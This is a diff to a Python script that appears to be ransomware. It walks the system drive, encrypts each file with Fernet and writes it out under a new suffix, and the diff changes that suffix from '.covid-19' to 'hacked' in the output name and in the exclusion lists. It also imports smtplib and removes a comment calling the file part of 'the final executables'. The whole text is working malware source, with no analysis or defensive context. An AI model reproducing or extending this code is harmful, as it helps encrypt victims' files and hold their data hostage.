@@ -7,8 +7,6 @@ from email import encoders
 from cryptography.fernet import Fernet
 import os, sys, base64, smtplib
 
-""" THIS FILE IS PART OF THE FINAL EXECUTABLES """
-
 # GET THE ENVIRONMENT VARIABLE
 letter_drive = os.environ["SystemDrive"]
 current_user = os.environ["USERNAME"]
@@ -30,7 +28,7 @@ def file_encrypt(key, name):
 
     fernet = Fernet(key)
     encrypted = fernet.encrypt(data)
-    encrypted_file = name + ".covid-19"
+    encrypted_file = name + "hacked"
     try:
         with open(encrypted_file, 'wb') as files:
             files.write(encrypted)
@@ -94,7 +92,7 @@ while True:
                 if not(file in my_files):
                     for ext in file.split("."):
                         if(file.endswith(ext)):
-                            my_ext = ["pyc", "pyd", "tcl", "h", "msg", "enc", "covid-19"]
+                            my_ext = ["pyc", "pyd", "tcl", "h", "msg", "enc", "hacked"]
                             if not(ext in my_ext):
                                 try:
                                     full_path = os.path.join(root, file)
@@ -117,7 +115,7 @@ while True:
                     for file in files:
                         for ext in file.split("."):
                             if file.endswith(ext):
-                                my_ext = ["covid-19"]
+                                my_ext = ["hacked"]
                                 if not(ext in my_ext):
                                     try:
                                         full_path = os.path.join(root, file)
